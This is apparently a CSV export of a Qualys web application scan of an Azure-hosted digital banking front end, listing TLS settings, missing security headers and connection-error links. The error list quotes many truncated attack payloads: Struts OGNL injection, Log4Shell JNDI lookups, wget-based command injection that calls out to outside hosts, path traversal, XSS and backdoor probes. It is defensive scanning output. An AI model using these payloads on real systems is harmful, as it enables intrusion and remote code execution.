+Batch #4 shell shock detector: 1 vulnsigs tests, completed 2  requests, 0 seconds. Completed 2 requests of 2 estimated requests (100%). All tests completed.
+Batch #4 shell shock detector(form): estimated time &lt; 1 minute (1 tests, 0 inputs)
+Batch #4 shell shock detector(form): 1 vulnsigs tests, completed 0  requests, 0 seconds. No tests to execute.
+Cookies Without Consent no tests enabled.
+Batch #5 HTTP Time Bandit: estimated time &lt; 1 minute (1 tests, 10 inputs)
+Batch #5 HTTP Time Bandit: 1 vulnsigs tests, completed 0  requests, 0 seconds. No tests to execute.
+Path manipulation: Estimated requests (payloads x links): files with extension:(0 x 1) + files:(0 x 1) +  directories:(4 x 1) +  paths:(11 x 2) = total (26) 
+Batch #5 Path XSS manipulation: estimated time &lt; 1 minute (15 tests, 2 inputs)
+Batch #5 Path XSS manipulation: 15 vulnsigs tests, completed 25  requests, 40 seconds. Completed 25 requests of 26 estimated requests (96.1538%). All tests completed.
+Path manipulation: Estimated requests (payloads x links): files with extension:(0 x 1) + files:(0 x 1) +  directories:(1 x 1) +  paths:(0 x 2) = total (1) 
+Batch #5 Tomcat Vuln manipulation: estimated time &lt; 1 minute (1 tests, 2 inputs)
+Batch #5 Tomcat Vuln manipulation: 1 vulnsigs tests, completed 1  requests, 10 seconds. Completed 1 requests of 1 estimated requests (100%). All tests completed.
+Path manipulation: Estimated requests (payloads x links): files with extension:(0 x 1) + files:(0 x 1) +  directories:(16 x 1) +  paths:(0 x 2) = total (16) 
+Batch #5 Time based path manipulation: estimated time &lt; 1 minute (16 tests, 2 inputs)
+Batch #5 Time based path manipulation: 16 vulnsigs tests, completed 32  requests, 360 seconds. Completed 32 requests of 16 estimated requests (200%). All tests completed.
+Path manipulation: Estimated requests (payloads x links): files with extension:(4 x 1) + files:(18 x 1) +  directories:(143 x 1) +  paths:(18 x 2) = total (201) 
+Batch #5 Path manipulation: estimated time &lt; 1 minute (183 tests, 2 inputs)
+Batch #5 Path manipulation: 183 vulnsigs tests, completed 187  requests, 252 seconds. Completed 187 requests of 201 estimated requests (93.0348%). All tests completed.
+WebCgiHrsTests: no test enabled
+Batch #5 WebCgiGeneric: estimated time &lt; 1 minute (451 tests, 1 inputs)
+Batch #5 WebCgiGeneric: 451 vulnsigs tests, completed 284  requests, 463 seconds. Completed 284 requests of 1210 estimated requests (23.4711%). All tests completed.
+Batch #5 Open Redirect analysis: estimated time &lt; 1 minute (2 tests, 0 inputs)
+Batch #5 Open Redirect analysis: 2 vulnsigs tests, completed 0  requests, 6 seconds. No tests to execute.
+Duration of Crawl Time: 307.00 (seconds)
+Duration of Test Phase: 1847.00 (seconds)
+Total Scan Time: 2154.00 (seconds)
+
+Total requests made: 941
+Average server response time: 0.08 seconds
+
+Average browser load time: 0.09 seconds
+","16 Feb 2024 12:08AM GMT+0530","2d4b46bd-e93d-46e2-9571-d4ae7273bcd2","","","","","","",""
+"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261580","38717","","16 Feb 2024 12:08AM GMT+0530","9cde1015-155b-451e-a750-b013d8641830","","tcp","20.192.170.11","20.192.170.11","443","Certificate #0 CN=*.azurewebsites.net,O=Microsoft_Corporation,L=Redmond,ST=WA,C=US OCSP status: good
+","Certificate Fingerprint:00CF19054BB3EFFC62AAABC1196C42753EBDB19191BBBF8AD950CFA62D01AE78
+"
+"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261551","150208","
+Referrer-Policy: Header missing
+Response headers on link: GET https://fint-int-digitalbankingui-nra.azurewebsites.net/ response code: 403
+Connection: close
+Content-Length: 2342
+Content-Type: text/html
+Date: Thu, 15 Feb 2024 18:39:29 GMT
+
+Header missing on the following link(s):
+(Only first 50 such pages are listed)
+
+GET https://fint-int-digitalbankingui-nra.azurewebsites.net/ response code: 403
+GET https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico response code: 403
+","16 Feb 2024 12:08AM GMT+0530","8ff58246-9f6f-4e46-b140-481b7f3c1be7","","","","","","",""
+"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261553","150020","Links not permitted:
+(This list includes links from QIDs: 150010,150041,150143,150170)
+
+External links discovered:
+https://portal.azure.com/
+https://go.microsoft.com/fwlink/?linkid=2095007
+
+IP based excluded links:
+","16 Feb 2024 12:08AM GMT+0530","740f379e-156d-442b-aade-b7630fffd1cf","","","","","","",""
+"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261586","38706","","16 Feb 2024 12:08AM GMT+0530","4ac0140d-65f9-4c1a-a8c7-134a79cec570","","tcp","20.192.170.11","20.192.170.11","443","#table cols=""2""
+NAME STATUS
+TLSv1.2 _
+Extended_Master_Secret yes
+Encrypt_Then_MAC no
+Heartbeat no
+Truncated_HMAC no
+Cipher_priority_controlled_by server
+OCSP_stapling yes
+SCT_extension no
+TLSv1.3 _
+Heartbeat no
+Cipher_priority_controlled_by server
+OCSP_stapling yes
+SCT_extension no
+","PROPS
+PROP(1)
+	Name:Extended Master Secret Value:yes Protocol:TLSv1.2
+PROP(2)
+	Name:Encrypt Then MAC Value:no Protocol:TLSv1.2
+PROP(3)
+	Name:Heartbeat Value:no Protocol:TLSv1.2
+PROP(4)
+	Name:Truncated HMAC Value:no Protocol:TLSv1.2
+PROP(5)
+	Name:Cipher priority controlled by Value:server Protocol:TLSv1.2
+PROP(6)
+	Name:OCSP stapling Value:yes Protocol:TLSv1.2
+PROP(7)
+	Name:SCT extension Value:no Protocol:TLSv1.2
+PROP(8)
+	Name:Heartbeat Value:no Protocol:TLSv1.3
+PROP(9)
+	Name:Cipher priority controlled by Value:server Protocol:TLSv1.3
+PROP(10)
+	Name:OCSP stapling Value:yes Protocol:TLSv1.3
+PROP(11)
+	Name:SCT extension Value:no Protocol:TLSv1.3
+"
+"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261574","150206","
+Content-Security-Policy: Header missing
+Response headers on link: GET https://fint-int-digitalbankingui-nra.azurewebsites.net/ response code: 403
+Connection: close
+Content-Length: 2342
+Content-Type: text/html
+Date: Thu, 15 Feb 2024 18:39:29 GMT
+
+Header missing on the following link(s):
+(Only first 50 such pages are listed)
+
+GET https://fint-int-digitalbankingui-nra.azurewebsites.net/ response code: 403
+GET https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico response code: 403
+","16 Feb 2024 12:08AM GMT+0530","b1db6bf5-a001-4ccc-a96e-98619976cf44","","","","","","",""
+"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3263335","150018","
+Total number of unique links that encountered connection errors: 188
+Links with highest number of connection errors:
+  59 https://fint-int-digitalbankingui-nra.azurewebsites.net/
+  37 https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico
+   3 https://fint-int-digitalbankingui-nra.azurewebsites.net/geoserver/web/
+   3 https://fint-int-digitalbankingui-nra.azurewebsites.net/catalog/control/main
+   3 https://fint-int-digitalbankingui-nra.azurewebsites.net/rest/api/latest/repos?limit=1000
+   2 https://fint-int-digitalbankingui-nra.azurewebsites.net/struts/utils.js
+   2 https://fint-int-digitalbankingui-nra.azurewebsites.net/portal/info.jsp
+   2 https://fint-int-digitalbankingui-nra.azurewebsites.net/functionRouter
+   2 https://fint-int-digitalbankingui-nra.azurewebsites.net/dataname
+   2 https://fint-int-digitalbankingui-nra.azurewebsites.net/CFIDE/componentutils/cfcexplorer.cfc
+   2 https://fint-int-digitalbankingui-nra.azurewebsites.net/CFIDE/administrator/index.cfm
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/ -FORMDATA- &lt;map&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;flags&gt;0&lt;/flags&gt; &lt;value class=""com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data""&gt; &lt;dataHandler&gt; &lt;dataSource class=""com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource""&gt; &lt;is class=""javax.crypto.CipherInputStream""&gt; &lt;cipher class=""javax.crypto.NullCipher""&gt; &lt;initialized&gt;false&lt;/initialized&gt; &lt;opmode&gt;0&lt;/opmode&gt; &lt;serviceIterator class=""javax.imageio.spi.FilterIter
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/../../../../../../../../../../etc/passwd
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/reports/
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/phpinfo.php
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/install/
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/core/
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/cache/
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/ -FORMDATA- &lt;map&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;flags&gt;0&lt;/flags&gt; &lt;value class=""com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data""&gt; &lt;dataHandler&gt; &lt;dataSource class=""com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource""&gt; &lt;is class=""javax.crypto.CipherInputStream""&gt; &lt;cipher class=""javax.crypto.NullCipher""&gt; &lt;initialized&gt;false&lt;/initialized&gt; &lt;opmode&gt;0&lt;/opmode&gt; &lt;serviceIterator class=""javax.imageio.spi.FilterIter
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.bak
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/ -FORMDATA- ------WebKitFormBoundaryl7d1B1aGsV2wcZwF
+Content-Disposition: form-data; name=""name""
+
+(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map2.setBean(#request.get('map').get('context')) == true).toString().subs
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/ -FORMDATA- ------WebKitFormBoundaryl7d1B1aGsV2wcZwF
+Content-Disposition: form-data; name=""name""
+
+(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map2.setBean(#request.get('map').get('context')) == true).toString().subs
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/druid/indexer/v1/sampler -FORMDATA- {""type"":""kafka"",""spec"":{""type"":""kafka"",""ioConfig"":{""type"":""kafka"",""consumerProperties"":{""bootstrap.servers"":""127.0.0.1:6666"",""sasl.mechanism"":""SCRAM-SHA-256"",""security.protocol"":""SASL_SSL"",""sasl.jaas.config"":""com.sun.security.auth.module.JndiLoginModule required user.provider.url=\""rmi://045dcf9119c2f94d9007f228f1e20fe805e45989.729973036092606.2710728069.webcgioob15068503.webcgioob.oob.default.qualys.com/Qualys
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/images/joomla_black.png
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/test/
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net//%27%20onmouseover%3D%27alert%289%29%3B%27
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/.svn/entries
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/api.php?wsdl
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/index.action -FORMDATA- ------WebKitFormBoundaryl7d1B1aGsV2wcZwF
+Content-Disposition: form-data; name=""id""
+
+%{
+(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
+(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +
+(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
+(#request.map2.setBean(#request.get('map').get('context')) == t
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/druid/indexer/v1/sampler -FORMDATA- {""type"":""kafka"",""spec"":{""type"":""kafka"",""ioConfig"":{""type"":""kafka"",""consumerProperties"":{""bootstrap.servers"":""127.0.0.1:6666"",""sasl.mechanism"":""SCRAM-SHA-256"",""security.protocol"":""SASL_SSL"",""sasl.jaas.config"":""com.sun.security.auth.module.JndiLoginModule required user.provider.url=\""rmi://f003c9a18b17e9836b3383172ad4edfcc7733c5a.729973036092606.2634475757.webcgioob15068503.webcgioob.oob.default.qualys.com/Qualys
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico.orig
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/tools/
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/cmdjsp.jsp
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/core/misc/drupal.js
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/sendRequest.jsp
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/php-backdoor.php
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/druid/indexer/v1/sampler?for=connect -FORMDATA- {""type"":""kafka"",""spec"":{""type"":""kafka"",""ioConfig"":{""type"":""kafka"",""consumerProperties"":{""bootstrap.servers"":""127.0.0.1:6666"",""sasl.mechanism"":""SCRAM-SHA-256"",""security.protocol"":""SASL_SSL"",""sasl.jaas.config"":""com.sun.security.auth.module.JndiLoginModule required user.provider.url=\""ldap://a1fd7e857975a2bea7a103af8f0d926aba47bf07.729973036092606.4122646659.webcgioob15068502.webcgioob.oob.default.qual
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/images/banners/shop-ad.jpg
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/imports/
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico/%27%20onmouseover%3D%27alert%289%29%3B%27
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/roles/
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/admin.aspx
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico.inc
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/misc/drupal.js
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico.tar.gz
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/pub/errors/enterprise/images/logo.gif
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico%3cscript%3e_q_q=%27%29%28%27%3c/script%3e
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/api.asmx?wsdl
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/manager/
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/ -FORMDATA- ------WebKitFormBoundaryl7d1B1aGsV2wcZwF
+Content-Disposition: form-data; name=""id""
+
+%{
+(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
+(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +
+(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
+(#request.map2.setBean(#request.get('map').get('context')) == true).toStrin
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net//%22%3e%3cimg%20src%3dq%20onerror%3dalert(9)%3e
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/ChangeLog
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/%E5%98%8D%E5%98%8A%0AQualysWASInjection:%20Vulnerable
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/ws/
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico/z--%3E%3Cqss%3E
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/druid/indexer/v1/sampler?for=connect -FORMDATA- {""type"":""kafka"",""spec"":{""type"":""kafka"",""ioConfig"":{""type"":""kafka"",""consumerProperties"":{""bootstrap.servers"":""127.0.0.1:6666"",""sasl.mechanism"":""SCRAM-SHA-256"",""security.protocol"":""SASL_SSL"",""sasl.jaas.config"":""com.sun.security.auth.module.JndiLoginModule required user.provider.url=\""ldap://5f7374569fb5deb41d91ff9000e2254bb0927c47.729973036092606.2875042361.webcgioob15068502.webcgioob.oob.default.qual
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/users/
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/$%7bjndi:ldap:%2f%2f5b5039a7335af84c33be8365a017346911935060.729973036092606.3189663716.webcgioob15044042.webcgioob.oob.default.qualys.com%2fQualysWAS%7d
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net//%22%20qss%3D%22QssAttrValue
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/qsd-php-backdoor.php?c=id
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/zend.jsp
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/?id=%25%7B%28%23request%2Emap%3D%23%40org%2Eapache%2Ecommons%2Ecollections%2EBeanMap%40%7B%7D%29%2EtoString%28%29%2Esubstring%280%2C0%29%20%2B%28%23request%2Emap%2EsetBean%28%23request%2Eget%28%27struts%2EvalueStack%27%29%29%20%3D%3D%20true%29%2EtoString%28%29%2Esubstring%280%2C0%29%20%2B%28%23request%2Emap2%3D%23%40org%2Eapache%2Ecommons%2Ecollections%2EBeanMap%40%7B%7D%29%2EtoString%28%29%2Esubstring%280%2C0%29%20%2B%28%23request%2Emap2%2EsetBe
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/RandomFilebP6DZKsx0c2M.jsp/
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/skill/list.action -FORMDATA- ------WebKitFormBoundaryl7d1B1aGsV2wcZwF
+Content-Disposition: form-data; name=""skillName""
+
+(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map2.setBean(#request.get('map').get('context')) ==
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico.zip
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/logs/
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/%24%7B%23foo%3D%27%25%7B%20134%20%2a%2031%20%2a%2053%20%2a%2097%20-13579%20%7D%27%2C%20%23foo%7D
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico_async/AsyncResponseService -FORMDATA- &lt;soapenv:Envelope xmlns:soapenv=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:wsa=""http://www.w3.org/2005/08/addressing"" xmlns:asy=""http://www.bea.com/async/AsyncResponseService""&gt;&lt;soapenv:Header&gt;&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;&lt;work:WorkContext xmlns:work=""http://bea.com/2004/06/soap/workarea/""&gt;&lt;java&gt;&lt;class&gt;&lt;string&gt;org.slf4j.ext.EventData&lt;/string&gt;&lt;void&gt;&lt;string&gt;&lt;![CD
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/jquery/jquery.validate.js
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/../../../../../../../../../../Progra~1/desktop.ini
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/db/
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/.tar.gz
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/Search.jsp -FORMDATA- query=\${jndi:ldap://cf27247871261adc36e335713795397def4c0ba7.729973036092606.3370712392.webcgioob15044045.webcgioob.oob.default.qualys.com/a}
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/JspSpy.jsp
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/solr/admin/collections -FORMDATA- action=\${jndi:rmi://f69447ec4e1583bb192722161aaab1e98d92a4d8.729973036092606.3236168650.webcgioob15044028.webcgioob.oob.default.qualys.com/a}
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/simple-backdoor.php?cmd=id
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net//../../../../../../../../../Windows/System32/drivers/etc/hosts
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/sources/
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/administration/
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/index.bat?&set&qualyswas
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/druid/coordinator/v1/lookups/config/$%7bjndi:rmi:%2f%2f615a8e054fac5e2ea5a7247fb8c1fba77407ddb2.729973036092606.4152197998.webcgioob15044040.webcgioob.oob.default.qualys.com%2fa%7d
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/../../favicon.ico.test1
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/$%7Bjndi:ldap://87f7a5d701bf9e5c55342081f7dc3c34eb762d6a.729973036092606.1435678717.webcgioob15044041.webcgioob.oob.default.qualys.com/QualysWAS%7D
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/%27
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico?""&gt;&lt;qss&gt;=
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/extranet/
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/$%7Bjndi:$%7Blower:l%7D$%7Blower:d%7D$%7Blower:a%7D$%7Blower:p%7D://f3cbbe052a5d8e1f94d05d525cbe1e0df5165f0f.729973036092606.2276069814.webcgioob15044044.webcgioob.oob.default.qualys.com/QualysWAS%7D
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/?doAs=%60wget+http%3a//757d0c4fc98bc71715544ff175e02fd50295c813.729973036092606.1295522928.webcgioob15055703.webcgioob.oob.default.qualys.com%60
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/temp/
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/zehir4.asp
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/www/
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/?welcome_message=q%0d%0a%20Qualys_resp_hdr_injection:%20Vulnerable
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.orig
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/BUGS
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/api/getServices?name%5B%5D=$(wget%20http://710b1b6643196a29d3e7e623b97cb74d887a026f.729973036092606.411116520.webcgioob15050302.webcgioob.oob.default.qualys.com)
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico.test2
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/index.action -FORMDATA- ------WebKitFormBoundaryl7d1B1aGsV2wcZwF
+Content-Disposition: form-data; name=""id""
+
+%{
+(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
+(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +
+(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
+(#request.map2.setBean(#request.get('map').get('context')) == t
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/internet/
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/?doAs=%60wget+http%3a//48ff6a6bc3b70f36e2c74c62917788b2dc33ace1.729973036092606.1501929911.webcgioob15055703.webcgioob.oob.default.qualys.com%60
+   1 https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.old
+
+Phase wise summary of timeout and connection errors encountered: 
+ePhaseCMSDetection                 :          0        16
+ePhaseWSDirectoryPathTests         :          0         3
+ePhaseWSEnumeration                :          0         5
+ePhaseWebCgiOob                    :          0        94
+ePhaseHeaderTests                  :          0        61
+ePhasePathXssTests                 :          0        14
+ePhaseTomcatTests                  :          0         1
+ePhasePathTests                    :          0       100
+","16 Feb 2024 12:08AM GMT+0530","ac52ede2-a4a8-4a7a-b99d-1138aac31e24","","","","","","",""
+"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261582","42350","","16 Feb 2024 12:08AM GMT+0530","b23241b4-2d4d-45df-89d8-8a8d18fad9df","","tcp","20.192.170.11","20.192.170.11","443","TLS Secure Renegotiation Extension Status: supported.",""
+"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261584","38116","","16 Feb 2024 12:08AM GMT+0530","715484b6-64ed-43ee-8977-19f6a92d2329","","tcp","20.192.170.11","20.192.170.11","443","#table cols=""6""
+CIPHER KEY-EXCHANGE AUTHENTICATION MAC ENCRYPTION(KEY-STRENGTH) GRADE
+SSLv2_PROTOCOL_IS_DISABLED _ _ _ _ _
+SSLv3_PROTOCOL_IS_DISABLED _ _ _ _ _
+TLSv1_PROTOCOL_IS_DISABLED _ _ _ _ _
+TLSv1.1_PROTOCOL_IS_DISABLED _ _ _ _ _
+TLSv1.2_PROTOCOL_IS_ENABLED _ _ _ _ _
+TLSv1.2 COMPRESSION_METHOD None _ _ _
+AES128-SHA RSA RSA SHA1 AES(128) MEDIUM
+AES256-SHA RSA RSA SHA1 AES(256) HIGH
+AES128-GCM-SHA256 RSA RSA AEAD AESGCM(128) MEDIUM
+AES256-GCM-SHA384 RSA RSA AEAD AESGCM(256) HIGH
+ECDHE-RSA-AES128-SHA ECDH RSA SHA1 AES(128) MEDIUM
+ECDHE-RSA-AES256-SHA ECDH RSA SHA1 AES(256) HIGH
+ECDHE-RSA-AES128-SHA256 ECDH RSA SHA256 AES(128) MEDIUM
+ECDHE-RSA-AES256-SHA384 ECDH RSA SHA384 AES(256) HIGH
+ECDHE-RSA-AES128-GCM-SHA256 ECDH RSA AEAD AESGCM(128) MEDIUM
+ECDHE-RSA-AES256-GCM-SHA384 ECDH RSA AEAD AESGCM(256) HIGH
+AES128-SHA256 RSA RSA SHA256 AES(128) MEDIUM
+AES256-SHA256 RSA RSA SHA256 AES(256) HIGH
+TLSv1.3_PROTOCOL_IS_ENABLED _ _ _ _ _
+TLS13-AES-128-GCM-SHA256 N/A N/A AEAD AESGCM(128) MEDIUM
+TLS13-AES-256-GCM-SHA384 N/A N/A AEAD AESGCM(256) HIGH
+","CIPHERS
+CIPHER(1)
+	Name:TLS13-AES-128-GCM-SHA256 Auth:N/A Encryption:AESGCM(128) Grade:MEDIUM Key-Exchange:N/A Mac:AEAD Protocol:TLSv1.3
+CIPHER(2)
+	Name:TLS13-AES-256-GCM-SHA384 Auth:N/A Encryption:AESGCM(256) Grade:HIGH Key-Exchange:N/A Mac:AEAD Protocol:TLSv1.3
+"
+"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261573","150009","Duration of crawl phase (seconds): 307.00
+Number of links: 2
+(This number excludes form requests and links re-requested during authentication.)
+
+https://fint-int-digitalbankingui-nra.azurewebsites.net/
+https://fint-int-digitalbankingui-nra.azurewebsites.net/favicon.ico
+","16 Feb 2024 12:08AM GMT+0530","a4d29706-bd5d-49ee-ba49-d82aefdb09b9","","","","","","",""
+"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261577","38291","","16 Feb 2024 12:08AM GMT+0530","46a739d3-f733-4142-b9a5-a6d72421c130","","tcp","20.192.170.11","20.192.170.11","443","TLSv1.2 session caching is disabled on the target.
+TLSv1.3 session caching is disabled on the target.
+",""
+"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261585","38704","","16 Feb 2024 12:08AM GMT+0530","48fa81b6-6f7b-4a9d-aa67-7f20fd488889","","tcp","20.192.170.11","20.192.170.11","443","#table cols=""6""
+NAME GROUP KEY-SIZE FORWARD-SECRET CLASSICAL-STRENGTH QUANTUM-STRENGTH
+TLSv1.2 _ _ _ _ _
+RSA _ 2048 no 110 low
+ECDHE secp521r1 521 yes 260 low
+ECDHE secp384r1 384 yes 192 low
+ECDHE secp256r1 256 yes 128 low
+TLSv1.3 _ _ _ _ _
+ECDHE secp521r1 521 yes 260 low
+ECDHE secp384r1 384 yes 192 low
+ECDHE secp256r1 256 yes 128 low
+","KEXS
+KEX(1)
+	Kex:RSA Group: Protocol:TLSv1.2 KeySize:2048 FwdSec:no Classical:110 Quantum:low
+KEX(2)
+	Kex:ECDHE Group: Protocol:TLSv1.2 KeySize:521 FwdSec:yes Classical:260 Quantum:low
+KEX(3)
+	Kex:ECDHE Group: Protocol:TLSv1.2 KeySize:384 FwdSec:yes Classical:192 Quantum:low
+KEX(4)
+	Kex:ECDHE Group: Protocol:TLSv1.2 KeySize:256 FwdSec:yes Classical:128 Quantum:low
+KEX(5)
+	Kex:ECDHE Group: Protocol:TLSv1.3 KeySize:521 FwdSec:yes Classical:260 Quantum:low
+KEX(6)
+	Kex:ECDHE Group: Protocol:TLSv1.3 KeySize:384 FwdSec:yes Classical:192 Quantum:low
+KEX(7)
+	Kex:ECDHE Group: Protocol:TLSv1.3 KeySize:256 FwdSec:yes Classical:128 Quantum:low
+"
+"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261581","38718","","16 Feb 2024 12:08AM GMT+0530","177653fa-dec1-4a83-ac4d-e8f26abfbfbd","","tcp","20.192.170.11","20.192.170.11","443","#table cols=""6""
+Source Validated Name URL ID Time
+Certificate_#0 _ CN=*.azurewebsites.net,O=Microsoft_Corporation,L=Redmond,ST=WA,C=US _ _ _
+Certificate no (unknown) (unknown) eecdd064d5db1acec55cb79db4cd13a23287467cbcecdec351485946711fb59b Thu_01_Jan_1970_12:00:00_AM_GMT
+Certificate no (unknown) (unknown) 48b0e36bdaa647340fe56a02fa9d30eb1c5201cb56dd2c81d9bbbfab39d88473 Thu_01_Jan_1970_12:00:00_AM_GMT
